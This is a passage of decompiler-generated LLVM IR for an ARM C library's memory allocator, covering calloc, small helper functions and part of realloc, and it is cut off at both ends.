  uselistorder i32 %v1_11fc8, { 1, 0 }
  uselistorder i32 %v3_11fa0, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_11f80, { 1, 0, 2 }
  uselistorder i32 %v2_11f68, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11f10, { 2, 1, 0 }
  uselistorder i32 %v6_11f04, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_11ee0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11ea0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11e60, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_11e58, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11e54, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_11e40, { 1, 0 }
  uselistorder i32 %v7_11e00, { 1, 0 }
  uselistorder i32 %v4_11e00, { 1, 0 }
  uselistorder i32 %v0_11dd0, { 1, 0 }
  uselistorder i32 %v2_11da4, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_11da057, { 1, 0 }
  uselistorder i32 %v1_11d6c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_11d54., { 1, 2, 0 }
  uselistorder i32 %v0_11d5c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11d5c, { 1, 0 }
  uselistorder i32 %v3_11d3c, { 1, 0 }
  uselistorder i32 %v4_11d38, { 1, 0, 2 }
  uselistorder i32 %v1_11ca8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11d00, { 1, 0 }
  uselistorder i32 %v1_11ce4, { 1, 0 }
  uselistorder i32 %v1_11b84, { 1, 0 }
  uselistorder i32 %v0_11cc4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11c8c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11d20.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11c68, { 2, 1, 0 }
  uselistorder i32 %v3_11c5c, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_11b7c, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11c24, { 1, 0 }
  uselistorder i32 %v3_11c18, { 1, 0 }
  uselistorder i32 %v0_11c24, { 1, 0 }
  uselistorder i32 %v3_11bfc, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11bec, { 1, 0, 2 }
  uselistorder i32 %v3_11ba4, { 2, 1, 0 }
  uselistorder i32 %v0_11b94, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11b64, { 1, 0 }
  uselistorder i32 %v1_11b18, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11b14, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11ab8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11aac, { 1, 0 }
  uselistorder i32 %v3_11a7c, { 1, 0 }
  uselistorder i32 %v0_11a70, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_11a50, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11a44, { 1, 0 }
  uselistorder i32 %v0_11a14, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 110, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_122bc, { 1, 0 }
  uselistorder label %dec_label_pc_122a0, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1229c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12284, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12218, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12194, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1218c, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12060, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_11f94, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_11e4c, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_11da0, { 1, 0 }
  uselistorder label %dec_label_pc_11da8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11d6c, { 1, 0 }
  uselistorder label %dec_label_pc_11d20, { 1, 0 }
  uselistorder label %dec_label_pc_11cb4, { 1, 0 }
  uselistorder label %dec_label_pc_11cb0, { 1, 0 }
  uselistorder label %dec_label_pc_11c5c, { 1, 0 }
  uselistorder label %dec_label_pc_11c48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c10, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11bfc, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_122d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_122d0:
  %v0_122d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_122d0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_122d0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_122d0, %bb
  %v4_122ec = phi i32 [ %arg1, %dec_label_pc_122d0 ], [ 0, %bb ]
  ret i32 %v4_122ec

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_122f0 = load i32, i32* @r4, align 4
  %v6_122f0 = load i32, i32* @r5, align 4
  %v9_122f0 = load i32, i32* @r6, align 4
  %v12_122f0 = load i32, i32* @lr, align 4
  %v2_122f8 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12308 = mul i32 %arg2, %arg1
  store i32 %v2_12308, i32* @r6, align 4
  br i1 %v2_122f8, label %dec_label_pc_12340, label %dec_label_pc_12310

dec_label_pc_12310:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12318 = udiv i32 %v2_12308, %arg1
  %v9_1231c = icmp eq i32 %v2_12318, %arg2
  br i1 %v9_1231c, label %dec_label_pc_12340, label %dec_label_pc_12324

dec_label_pc_12324:                               ; preds = %dec_label_pc_12310
  %v0_12328 = call i32 @__aeabi_read_tp()
  %v3_1232c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1232c = sext i16 %v3_1232c to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12338 = add i32 %v4_1232c, %v0_12328
  %v4_12338 = inttoptr i32 %v3_12338 to i32*
  store i32 12, i32* %v4_12338, align 4
  br label %dec_label_pc_12404

dec_label_pc_12340:                               ; preds = %dec_label_pc_12310, %entry
  %v4_12344 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 108) to i32*), align 4
  store i32 %v4_12344, i32* @r4, align 4
  %v4_1235c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  store i32 %v4_1235c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1235c)
  %v0_12370 = load i32, i32* @r5, align 4
  %v2_12370 = add i32 %v0_12370, 16
  %v3_12370 = inttoptr i32 %v2_12370 to i32*
  %v4_12370 = load i32, i32* %v3_12370, align 4
  store i32 %v4_12370, i32* %ip.global-to-local, align 4
  store i32 74620, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12370)
  %v0_1237c = load i32, i32* @r6, align 4
  store i32 %v0_1237c, i32* @r0, align 4
  %v0_12380 = call i32 @malloc()
  store i32 %v0_12380, i32* %r4.global-to-local, align 4
  %v2_12384 = icmp eq i32 %v0_12380, 0
  br i1 %v2_12384, label %.thread, label %dec_label_pc_1238c

dec_label_pc_1238c:                               ; preds = %dec_label_pc_12340
  %v1_1238c = add i32 %v0_12380, -4
  %v2_1238c = inttoptr i32 %v1_1238c to i32*
  %v3_1238c = load i32, i32* %v2_1238c, align 4
  %v1_12390 = and i32 %v3_1238c, 2
  %v2_12390 = icmp eq i32 %v1_12390, 0
  br i1 %v2_12390, label %dec_label_pc_12398, label %.thread

dec_label_pc_12398:                               ; preds = %dec_label_pc_1238c
  %v1_123986 = add i32 %v3_1238c, -4
  %v1_1239c = and i32 %v1_123986, -4
  %v3_123a0 = udiv i32 %v1_1239c, 4
  store i32 %v3_123a0, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1239c, 36
  %v2_123a8 = icmp ult i32 %v1_1239c, 33
  %v3_123a8 = or i1 %tmp, %v2_123a8
  br i1 %v3_123a8, label %dec_label_pc_123b4, label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_12398
  %v3_123ac = inttoptr i32 %v0_12380 to i8*
  %v4_123ac = call i32 @__GI_memset(i8* %v3_123ac, i32 0, i32 %v1_1239c)
  br label %.thread

dec_label_pc_123b4:                               ; preds = %dec_label_pc_12398
  %tmp7 = icmp eq i32 %v1_1239c, 16
  %v2_123b8 = inttoptr i32 %v0_12380 to i32*
  store i32 0, i32* %v2_123b8, align 4
  %v1_123bc = load i32, i32* %r4.global-to-local, align 4
  %v2_123bc = add i32 %v1_123bc, 4
  %v3_123bc = inttoptr i32 %v2_123bc to i32*
  store i32 0, i32* %v3_123bc, align 4
  %v1_123c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_123c0 = add i32 %v1_123c0, 8
  %v3_123c0 = inttoptr i32 %v2_123c0 to i32*
  store i32 0, i32* %v3_123c0, align 4
  %v2_123c4 = icmp ult i32 %v1_1239c, 13
  %v3_123c4 = or i1 %tmp7, %v2_123c4
  br i1 %v3_123c4, label %.thread, label %dec_label_pc_123c8

dec_label_pc_123c8:                               ; preds = %dec_label_pc_123b4
  %v0_123c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_123cc = load i32, i32* %r4.global-to-local, align 4
  %v2_123cc = add i32 %v1_123cc, 12
  %v3_123cc = inttoptr i32 %v2_123cc to i32*
  store i32 0, i32* %v3_123cc, align 4
  %v1_123d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_123d0 = add i32 %v1_123d0, 16
  %v3_123d0 = inttoptr i32 %v2_123d0 to i32*
  store i32 0, i32* %v3_123d0, align 4
  %tmp8 = icmp ult i32 %v0_123c8, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_123d8

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123c8
  %v0_123d8 = load i32, i32* %ip.global-to-local, align 4
  %v7_123d8 = icmp eq i32 %v0_123d8, 9
  %v1_123dc = load i32, i32* %r4.global-to-local, align 4
  %v2_123dc = add i32 %v1_123dc, 20
  %v3_123dc = inttoptr i32 %v2_123dc to i32*
  store i32 0, i32* %v3_123dc, align 4
  %v1_123e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_123e0 = add i32 %v1_123e0, 24
  %v3_123e0 = inttoptr i32 %v2_123e0 to i32*
  store i32 0, i32* %v3_123e0, align 4
  br i1 %v7_123d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_123d8
  %v2_123e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_123e4 = add i32 %v2_123e4, 32
  %v4_123e4 = inttoptr i32 %v3_123e4 to i32*
  store i32 0, i32* %v4_123e4, align 4
  %v2_123e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_123e8 = add i32 %v2_123e8, 28
  %v4_123e8 = inttoptr i32 %v3_123e8 to i32*
  store i32 0, i32* %v4_123e8, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_123d8, %dec_label_pc_1238c, %dec_label_pc_123c8, %dec_label_pc_123b4, %dec_label_pc_12340, %dec_label_pc_123ac, %bb
  store i32 1, i32* @r1, align 4
  %v0_123f8 = load i32, i32* @r5, align 4
  %v2_123f8 = add i32 %v0_123f8, 44
  %v3_123f8 = inttoptr i32 %v2_123f8 to i32*
  %v4_123f8 = load i32, i32* %v3_123f8, align 4
  store i32 %v4_123f8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_123f8)
  br label %dec_label_pc_12404

dec_label_pc_12404:                               ; preds = %dec_label_pc_12324, %.thread
  %v0_12404 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_122f0, i32* @r4, align 4
  store i32 %v6_122f0, i32* @r5, align 4
  store i32 %v9_122f0, i32* @r6, align 4
  store i32 %v12_122f0, i32* @lr, align 4
  ret i32 %v0_12404

; uselistorder directives
  uselistorder i32 %v1_1239c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_12380, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12404, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1241c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1241c:
  %v0_1241c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1241c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1241c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1241c, %bb
  %v4_1242c = phi i32 [ %arg1, %dec_label_pc_1241c ], [ 0, %bb ]
  ret i32 %v4_1242c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12430 = load i32, i32* @r4, align 4
  %v6_12430 = load i32, i32* @r5, align 4
  %v9_12430 = load i32, i32* @r6, align 4
  %v12_12430 = load i32, i32* @r7, align 4
  %v15_12430 = load i32, i32* @r8, align 4
  %v18_12430 = load i32, i32* @sb, align 4
  %v21_12430 = load i32, i32* @sl, align 4
  %v24_12430 = load i32, i32* @fp, align 4
  %v27_12430 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1243c = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1243c, label %dec_label_pc_12450, label %dec_label_pc_12460

dec_label_pc_12450:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12454 = call i32 @malloc()
  store i32 %v0_12454, i32* %r0.global-to-local, align 4
  store i32 %v0_12454, i32* @r4, align 4
  br label %dec_label_pc_127c0

dec_label_pc_12460:                               ; preds = %entry
  %v2_12460 = icmp eq i32 %arg2, 0
  br i1 %v2_12460, label %dec_label_pc_12468, label %dec_label_pc_12474

dec_label_pc_12468:                               ; preds = %dec_label_pc_12460
  %v0_12468 = call i32 @free()
  store i32 %v0_12468, i32* %r0.global-to-local, align 4
  %v0_1246c = load i32, i32* @r6, align 4
  store i32 %v0_1246c, i32* @r4, align 4
  br label %dec_label_pc_127c0

dec_label_pc_12474:                               ; preds = %dec_label_pc_12460
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_1247c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 108) to i32*), align 4
  store i32 %v4_1247c, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_1247c, i32* %r2.global-to-local, align 4
  %v4_12488 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 68) to i32*), align 4
  store i32 %v4_12488, i32* %r1.global-to-local, align 4
  %v2_1248c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1248c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12494 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12494)
  %v0_124a0 = load i32, i32* @r4, align 4
  store i32 %v0_124a0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r1.global-to-local, align 4
  %v4_124ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_124b8.447 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_124ac)
  %v0_124b8 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_124b8, -32
  br i1 %tmp36, label %dec_label_pc_124dc, label %dec_label_pc_124c0

dec_label_pc_124c0:                               ; preds = %dec_label_pc_12474
  store i32 ptrtoint (i32* @global_var_f220.449 to i32), i32* %r2.global-to-local, align 4
  %v0_124c4 = call i32 @__aeabi_read_tp()
  store i32 %v0_124c4, i32* %r0.global-to-local, align 4
  %v3_124c8 = load i16, i16* @global_var_216f0.341, align 2
  %v4_124c8 = sext i16 %v3_124c8 to i32
  store i32 %v4_124c8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_124d4 = add i32 %v4_124c8, %v0_124c4
  %v4_124d4 = inttoptr i32 %v3_124d4 to i32*
  store i32 12, i32* %v4_124d4, align 4
  br label %dec_label_pc_127c0

dec_label_pc_124dc:                               ; preds = %dec_label_pc_12474
  %v1_124dc = add i32 %v0_124b8, 11
  store i32 %v1_124dc, i32* %r0.global-to-local, align 4
  %v0_124e0 = load i32, i32* @r5, align 4
  %v1_124e0 = add i32 %v0_124e0, -4
  %v2_124e0 = inttoptr i32 %v1_124e0 to i32*
  %v3_124e0 = load i32, i32* %v2_124e0, align 4
  store i32 %v3_124e0, i32* %r2.global-to-local, align 4
  %v2_124e4 = icmp ugt i32 %v1_124dc, 14
  %v7_124e4 = icmp eq i32 %v1_124dc, 15
  %v2_124e8 = xor i1 %v2_124e4, true
  %v3_124e8 = or i1 %v7_124e4, %v2_124e8
  br i1 %v3_124e8, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_124dc
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_124dc, %bb
  %v2_124ec = xor i1 %v7_124e4, true
  %v3_124ec = and i1 %v2_124e4, %v2_124ec
  br i1 %v3_124ec, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_124ec = and i32 %v1_124dc, -8
  store i32 %v5_124ec, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_124f0 = and i32 %v3_124e0, 2
  %v2_124f0 = icmp eq i32 %v1_124f0, 0
  %v1_124f4 = add i32 %v0_124e0, -8
  store i32 %v1_124f4, i32* @sl, align 4
  %v1_124f8 = and i32 %v3_124e0, -4
  store i32 %v1_124f8, i32* @r6, align 4
  br i1 %v2_124f0, label %dec_label_pc_12500, label %dec_label_pc_126d8

dec_label_pc_12500:                               ; preds = %bb29
  %v1_12500 = load i32, i32* @sb, align 4
  %v3_12500 = icmp ult i32 %v1_124f8, %v1_12500
  br i1 %v3_12500, label %dec_label_pc_1250c, label %bb30

bb30:                                             ; preds = %dec_label_pc_12500
  store i32 %v1_124f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12670

dec_label_pc_1250c:                               ; preds = %dec_label_pc_12500
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12514 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_12514, i32* %r0.global-to-local, align 4
  %v1_12518 = add i32 %v4_12514, 44
  %v2_12518 = inttoptr i32 %v1_12518 to i32*
  %v3_12518 = load i32, i32* %v2_12518, align 4
  store i32 %v3_12518, i32* %r3.global-to-local, align 4
  %v2_1251c = add i32 %v1_124f8, %v1_124f4
  store i32 %v2_1251c, i32* @r4, align 4
  %v9_12520 = icmp eq i32 %v2_1251c, %v3_12518
  %v1_12524 = add i32 %v2_1251c, 4
  %v2_12524 = inttoptr i32 %v1_12524 to i32*
  %v3_12524 = load i32, i32* %v2_12524, align 4
  store i32 %v3_12524, i32* %r1.global-to-local, align 4
  br i1 %v9_12520, label %dec_label_pc_1252c, label %dec_label_pc_12568

dec_label_pc_1252c:                               ; preds = %dec_label_pc_1250c
  %v1_1252c = and i32 %v3_12524, -4
  %v2_12530 = add i32 %v1_1252c, %v1_124f8
  store i32 %v2_12530, i32* %r1.global-to-local, align 4
  %v1_12534 = add i32 %v1_12500, 16
  store i32 %v1_12534, i32* %r3.global-to-local, align 4
  %v3_12538 = icmp ult i32 %v2_12530, %v1_12534
  br i1 %v3_12538, label %dec_label_pc_125bc, label %dec_label_pc_12540

dec_label_pc_12540:                               ; preds = %dec_label_pc_1252c
  %v2_12540 = sub i32 %v2_12530, %v1_12500
  %v1_12544 = urem i32 %v3_124e0, 2
  %v2_12548 = add i32 %v1_12500, %v1_124f4
  store i32 %v2_12548, i32* %r1.global-to-local, align 4
  %v2_1254c = or i32 %v1_12500, %v1_12544
  store i32 %v2_1254c, i32* %r2.global-to-local, align 4
  %v1_12550 = or i32 %v2_12540, 1
  store i32 %v1_12550, i32* %r3.global-to-local, align 4
  store i32 %v0_124e0, i32* @r4, align 4
  store i32 %v2_1254c, i32* %v2_124e0, align 4
  %v0_1255c = load i32, i32* %r1.global-to-local, align 4
  %v1_1255c = load i32, i32* %r0.global-to-local, align 4
  %v2_1255c = add i32 %v1_1255c, 44
  %v3_1255c = inttoptr i32 %v2_1255c to i32*
  store i32 %v0_1255c, i32* %v3_1255c, align 4
  %v0_12560 = load i32, i32* %r3.global-to-local, align 4
  %v1_12560 = load i32, i32* %r1.global-to-local, align 4
  %v2_12560 = add i32 %v1_12560, 4
  %v3_12560 = inttoptr i32 %v2_12560 to i32*
  store i32 %v0_12560, i32* %v3_12560, align 4
  br label %dec_label_pc_127a4

dec_label_pc_12568:                               ; preds = %dec_label_pc_1250c
  %v1_12568 = and i32 %v3_12524, -2
  %v2_1256c = add i32 %v1_12568, %v2_1251c
  store i32 %v2_1256c, i32* %r3.global-to-local, align 4
  %v1_12570 = add i32 %v2_1256c, 4
  %v2_12570 = inttoptr i32 %v1_12570 to i32*
  %v3_12570 = load i32, i32* %v2_12570, align 4
  store i32 %v3_12570, i32* %r3.global-to-local, align 4
  %v1_12574 = urem i32 %v3_12570, 2
  %v2_12574 = icmp eq i32 %v1_12574, 0
  br i1 %v2_12574, label %dec_label_pc_1257c, label %dec_label_pc_125bc

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12568
  %v1_1257c = and i32 %v3_12524, -4
  store i32 %v1_1257c, i32* %r3.global-to-local, align 4
  %v2_12580 = add i32 %v1_1257c, %v1_124f8
  store i32 %v2_12580, i32* %r0.global-to-local, align 4
  %v3_12584 = icmp ult i32 %v2_12580, %v1_12500
  br i1 %v3_12584, label %dec_label_pc_125bc, label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %dec_label_pc_1257c
  %v1_1258c = add i32 %v1_124f8, %v0_124e0
  %v2_1258c = inttoptr i32 %v1_1258c to i32*
  %v3_1258c = load i32, i32* %v2_1258c, align 4
  store i32 %v3_1258c, i32* %r1.global-to-local, align 4
  %v1_12590 = add i32 %v3_1258c, 12
  %v2_12590 = inttoptr i32 %v1_12590 to i32*
  %v3_12590 = load i32, i32* %v2_12590, align 4
  store i32 %v3_12590, i32* %r3.global-to-local, align 4
  %v9_12594 = icmp eq i32 %v3_12590, %v2_1251c
  %v1_12598 = add i32 %v2_1251c, 12
  %v2_12598 = inttoptr i32 %v1_12598 to i32*
  %v3_12598 = load i32, i32* %v2_12598, align 4
  store i32 %v3_12598, i32* %r2.global-to-local, align 4
  br i1 %v9_12594, label %dec_label_pc_125a0, label %dec_label_pc_125ac

dec_label_pc_125a0:                               ; preds = %dec_label_pc_1258c
  %v1_125a0 = add i32 %v3_12598, 8
  %v2_125a0 = inttoptr i32 %v1_125a0 to i32*
  %v3_125a0 = load i32, i32* %v2_125a0, align 4
  store i32 %v3_125a0, i32* %r3.global-to-local, align 4
  %v9_125a4 = icmp eq i32 %v3_125a0, %v2_1251c
  br i1 %v9_125a4, label %dec_label_pc_125b0, label %dec_label_pc_125ac

dec_label_pc_125ac:                               ; preds = %dec_label_pc_1258c, %dec_label_pc_125a0
  %v0_125ac = call i32 @abort()
  store i32 %v0_125ac, i32* %r0.global-to-local, align 4
  %v0_125b0.pre = load i32, i32* @r1, align 4
  %v1_125b0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_125b0

dec_label_pc_125b0:                               ; preds = %dec_label_pc_125a0, %dec_label_pc_125ac
  %v1_125b0 = phi i32 [ %v3_12598, %dec_label_pc_125a0 ], [ %v1_125b0.pre, %dec_label_pc_125ac ]
  %v0_125b0 = phi i32 [ %v3_1258c, %dec_label_pc_125a0 ], [ %v0_125b0.pre, %dec_label_pc_125ac ]
  %v2_125b0 = add i32 %v1_125b0, 8
  %v3_125b0 = inttoptr i32 %v2_125b0 to i32*
  store i32 %v0_125b0, i32* %v3_125b0, align 4
  %v0_125b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_125b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_125b4 = add i32 %v1_125b4, 12
  %v3_125b4 = inttoptr i32 %v2_125b4 to i32*
  store i32 %v0_125b4, i32* %v3_125b4, align 4
  %v1_12670.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12670

dec_label_pc_125bc:                               ; preds = %dec_label_pc_1252c, %dec_label_pc_1257c, %dec_label_pc_12568
  %v1_125bc = add i32 %v1_12500, -7
  store i32 %v1_125bc, i32* @r0, align 4
  %v0_125c0 = call i32 @malloc()
  store i32 %v0_125c0, i32* @r0, align 4
  store i32 %v0_125c0, i32* %r1.global-to-local, align 4
  %v2_125c4 = icmp eq i32 %v0_125c0, 0
  br i1 %v2_125c4, label %bb31, label %dec_label_pc_125d0

bb31:                                             ; preds = %dec_label_pc_125bc
  store i32 0, i32* @r4, align 4
